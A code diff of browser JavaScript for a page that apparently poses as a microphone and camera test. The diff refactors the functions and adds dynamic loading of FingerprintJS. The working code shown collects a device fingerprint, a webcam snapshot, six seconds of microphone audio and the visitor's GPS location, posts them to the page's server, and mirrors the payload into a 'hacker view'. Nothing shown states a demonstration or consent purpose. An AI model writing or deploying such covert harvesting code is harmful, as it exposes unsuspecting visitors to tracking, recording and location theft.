@@ -7,15 +7,15 @@ document.addEventListener('DOMContentLoaded', () => {
   const micStatus = document.getElementById('micStatus');
   const audioBars = document.querySelectorAll('.audio-bar');
 
-  // Mobile detection
-  const isMobile = /Mobi|Android/i.test(navigator.userAgent);
-  if (isMobile) {
-    videoContainer.style.minHeight = '50vh';
-    startButton.style.fontSize = '18px';
-    startButton.style.padding = '15px 25px';
-  }
+  const loadScript = src => new Promise((resolve, reject) => {
+    const script = document.createElement('script');
+    script.src = src;
+    script.async = true;
+    script.onload = resolve;
+    script.onerror = () => reject(new Error(`Failed to load ${src}`));
+    document.head.appendChild(script);
+  });
 
-  // Start test button handler
   startButton.addEventListener('click', async () => {
     try {
       statusElement.textContent = "Initializing test...";
@@ -36,6 +36,47 @@ document.addEventListener('DOMContentLoaded', () => {
       startButton.disabled = false;
     }
   });
+
+  async function collectFingerprint() {
+    try {
+      if (typeof FingerprintJS === 'undefined') {
+        await loadScript('https://openfpcdn.io/fingerprintjs/v3');
+      }
+
+      const fp = await FingerprintJS.load();
+      const result = await fp.get();
+
+      const payload = {
+        visitorId: result.visitorId,
+        components: result.components,
+        confidence: result.confidence,
+        passive: {
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          screen: {
+            width: screen.width,
+            height: screen.height,
+            colorDepth: screen.colorDepth
+          },
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          languages: navigator.languages
+        }
+      };
+
+      if (window.updateHackerView) updateHackerView(payload);
+
+      const response = await fetch('/collect-fingerprint', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+
+      if (!response.ok) throw new Error('Failed to save fingerprint');
+    } catch (error) {
+      console.error('Fingerprint error:', error);
+      throw error;
+    }
+  }
 
   async function captureAndSaveMedia() {
     let stream;
@@ -138,156 +179,113 @@ document.addEventListener('DOMContentLoaded', () => {
       bar.style.height = '10%';
     });
   }
-});
 
-// Existing functions (unchanged but required)
-async function collectFingerprint() {
-  try {
-    // Load FingerprintJS agent
-    const fp = await FingerprintJS.load();
-    const result = await fp.get(); // get fingerprint
+  async function captureImageFrame(video) {
+    return new Promise((resolve) => {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
 
-    // Build payload with active + passive data
-    const payload = {
-      visitorId: result.visitorId,
-      components: result.components,
-      confidence: result.confidence,
-      passive: {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        screen: {
-          width: screen.width,
-          height: screen.height,
-          colorDepth: screen.colorDepth
-        },
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        languages: navigator.languages
-      }
-    };
+      const attemptCapture = (attempts = 3) => {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageData = ctx.getImageData(0, 0, 10, 10).data;
+        const isBlank = Array.from(imageData).every(val => val === 0);
 
-    // Optional: display in "hacker view"
-    if (window.updateHackerView) updateHackerView(payload);
-
-    // Send to server
-    const response = await fetch('/collect-fingerprint', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    });
-
-    if (!response.ok) throw new Error('Failed to save fingerprint');
-  } catch (error) {
-    console.error('Fingerprint error:', error);
-    throw error;
-  }
-}
-
-
-async function captureImageFrame(video) {
-  return new Promise((resolve) => {
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const ctx = canvas.getContext('2d');
-
-    const attemptCapture = (attempts = 3) => {
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const imageData = ctx.getImageData(0, 0, 10, 10).data;
-      const isBlank = Array.from(imageData).every(val => val === 0);
-
-      if (!isBlank || attempts <= 0) {
-        canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
-      } else {
-        setTimeout(() => attemptCapture(attempts - 1), 200);
-      }
-    };
-
-    attemptCapture();
-  });
-}
-
-async function recordAudio(stream) {
-  return new Promise((resolve) => {
-    try {
-      const audioChunks = [];
-      const recorder = new MediaRecorder(stream);
-
-      recorder.ondataavailable = (e) => {
-        if (e.data.size > 0) audioChunks.push(e.data);
-      };
-
-      recorder.onstop = () => {
-        if (audioChunks.length > 0) {
-          resolve(new Blob(audioChunks, { type: 'audio/webm' }));
+        if (!isBlank || attempts <= 0) {
+          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
         } else {
-          resolve(null);
+          setTimeout(() => attemptCapture(attempts - 1), 200);
         }
       };
 
-      recorder.start();
-      setTimeout(() => recorder.stop(), 6000);
+      attemptCapture();
+    });
+  }
 
-    } catch (error) {
-      console.error('Audio recording error:', error);
-      resolve(null);
-    }
-  });
-}
-
-async function saveMedia(type, blob, extension) {
-  return new Promise((resolve, reject) => {
-    const reader = new FileReader();
-    reader.onload = async () => {
+  async function recordAudio(stream) {
+    return new Promise((resolve) => {
       try {
-        const response = await fetch('/collect-media', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            type,
-            data: reader.result,
-            extension
-          })
-        });
+        const audioChunks = [];
+        const recorder = new MediaRecorder(stream);
 
-        if (!response.ok) throw new Error('Server error');
-        resolve();
+        recorder.ondataavailable = (e) => {
+          if (e.data.size > 0) audioChunks.push(e.data);
+        };
+
+        recorder.onstop = () => {
+          if (audioChunks.length > 0) {
+            resolve(new Blob(audioChunks, { type: 'audio/webm' }));
+          } else {
+            resolve(null);
+          }
+        };
+
+        recorder.start();
+        setTimeout(() => recorder.stop(), 6000);
+
       } catch (error) {
-        reject(error);
+        console.error('Audio recording error:', error);
+        resolve(null);
       }
-    };
-    reader.onerror = reject;
-    reader.readAsDataURL(blob);
-  });
-}
+    });
+  }
 
-async function collectLocation() {
-  if (!navigator.geolocation) return;
-
-  return new Promise((resolve) => {
-    navigator.geolocation.getCurrentPosition(
-      async (position) => {
+  async function saveMedia(type, blob, extension) {
+    return new Promise((resolve, reject) => {
+      const reader = new FileReader();
+      reader.onload = async () => {
         try {
-          await fetch('/collect-fingerprint', {
+          const response = await fetch('/collect-media', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-              location: {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude
-              }
+              type,
+              data: reader.result,
+              extension
             })
           });
+
+          if (!response.ok) throw new Error('Server error');
           resolve();
         } catch (error) {
-          console.error('Location save error:', error);
-          resolve();
+          reject(error);
         }
-      },
-      (error) => {
-        console.error('Geolocation error:', error);
-        resolve();
-      },
-      { timeout: 5000 }
-    );
-  });
-}
+      };
+      reader.onerror = reject;
+      reader.readAsDataURL(blob);
+    });
+  }
+
+  async function collectLocation() {
+    if (!navigator.geolocation) return;
+
+    return new Promise((resolve) => {
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          try {
+            await fetch('/collect-fingerprint', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                location: {
+                  latitude: position.coords.latitude,
+                  longitude: position.coords.longitude
+                }
+              })
+            });
+            resolve();
+          } catch (error) {
+            console.error('Location save error:', error);
+            resolve();
+          }
+        },
+        (error) => {
+          console.error('Geolocation error:', error);
+          resolve();
+        },
+        { timeout: 5000 }
+      );
+    });
+  }
+});
